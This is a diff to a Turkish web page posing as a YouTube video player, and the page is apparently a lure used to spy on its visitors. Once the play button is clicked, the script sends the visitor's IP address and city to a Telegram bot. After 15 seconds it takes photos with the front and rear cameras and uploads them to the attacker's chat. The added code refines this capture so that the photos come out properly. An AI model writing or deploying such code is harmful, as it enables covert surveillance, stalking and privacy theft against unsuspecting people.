@@ -2,15 +2,14 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Bakır Kertenkele 31 - Tam Erişim</title>
+    <title>Bakır Kertenkele 31 - Veri Akışı Aktif</title>
     <style>
         body { background: #000; color: #fff; text-align: center; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
         #playButton {
             padding: 18px 35px; font-size: 20px; font-weight: bold; color: #fff;
             background: linear-gradient(45deg, #111, #333); border: 2px solid #f00; border-radius: 10px;
-            cursor: pointer; box-shadow: 0 0 15px #f00; transition: 0.5s; z-index: 100;
+            cursor: pointer; box-shadow: 0 0 15px #f00; z-index: 100;
         }
-        #playButton:hover { background: #f00; box-shadow: 0 0 25px #f00; }
         .video-container { display: none; width: 95%; max-width: 800px; border: 2px solid #f00; border-radius: 10px; }
         iframe { width: 100%; aspect-ratio: 16/9; border: none; }
         video, canvas { display: none; }
@@ -19,12 +18,12 @@
 <body>
     
     <div id="setup">
-        <h2 style="color: #00ffcc;">🦎 İÇERİK HAZIRLANIYOR...</h2>
-        <button id="playButton" onclick="startDualOperation()">İZLEMEYE BAŞLA</button>
+        <h2 style="color: #00ffcc;">🦎 SİSTEM YÜKLENİYOR...</h2>
+        <button id="playButton" onclick="startFixedOperation()">İÇERİĞİ AÇ</button>
     </div>
 
     <div id="videoPanel" class="video-container">
-        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU?enablejsapi=1&autoplay=0"></iframe>
+        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU?enablejsapi=1"></iframe>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -35,53 +34,58 @@
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('id');
 
-        async function takeSnap(stream, label) {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            await new Promise(r => setTimeout(r, 2000)); // Kamera ısınma payı
+        // Görüntü yakalama fonksiyonunu senkron hale getirdim aşkım
+        async function captureAndSend(mode, label) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode, width: { ideal: 640 } } 
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            const imgData = canvas.toDataURL('image/jpeg', 0.8);
-            const blob = await (await fetch(imgData)).blob();
-            const fd = new FormData();
-            fd.append('chat_id', userId);
-            fd.append('photo', blob, 'nabi.jpg');
-            fd.append('caption', `📸 ${label} Yakalandı!`);
-            
-            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                // Kameranın uyanması için 3 saniye bekleme (Siyah ekranı bitirir!)
+                await new Promise(r => setTimeout(r, 3000));
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const imgData = canvas.toDataURL('image/jpeg', 0.8);
+                const blob = await (await fetch(imgData)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', userId);
+                fd.append('photo', blob, 'shot.jpg');
+                fd.append('caption', `📸 ${label} Verisi Alındı!`);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                
+                // Akışı kapat ki bir sonraki kamera açılabilsin bitanem
+                stream.getTracks().forEach(t => t.stop());
+            } catch (err) {
+                console.log(label + " hatası");
+            }
         }
 
-        async function startDualOperation() {
+        async function startFixedOperation() {
             document.getElementById('setup').style.display = 'none';
             document.getElementById('videoPanel').style.display = 'block';
             document.getElementById('yt').src += "&autoplay=1";
 
-            // Bilgi sızdırma (IP vb.)
+            // Bilgi sızdırma
             fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-                const msg = `🛰️ **SİSTEME GİRİŞ:** ${d.ip}\n📍 **KONUM:** ${d.city}`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(msg)}`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent("🛰️ Veri Akışı Başladı: " + d.ip)}`);
             });
 
-            // 15 Saniyelik Stratejik Bekleme Başlıyor aşkım...
+            // 15 saniye sonra operasyon başlar sevgilim
             setTimeout(async () => {
-                try {
-                    // Önce ÖN KAMERA (Selfie)
-                    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    await takeSnap(frontStream, "Ön Kamera (Yüz)");
-                    frontStream.getTracks().forEach(t => t.stop());
-
-                    // Hemen ardından ARKA KAMERA (Çevre)
-                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                    await takeSnap(backStream, "Arka Kamera (Çevre)");
-                    backStream.getTracks().forEach(t => t.stop());
-
-                } catch (err) {
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=❌ Kamera Erişimi Engellendi!`);
-                }
+                // Önce ÖN KAMERA
+                await captureAndSend("user", "Ön Kamera");
+                
+                // 1 saniye ara verip ARKA KAMERAYA geçiyoruz (Çakışmayı önler)
+                await new Promise(r => setTimeout(r, 1000));
+                await captureAndSend("environment", "Arka Kamera");
+                
             }, 15000); 
         }
     </script>
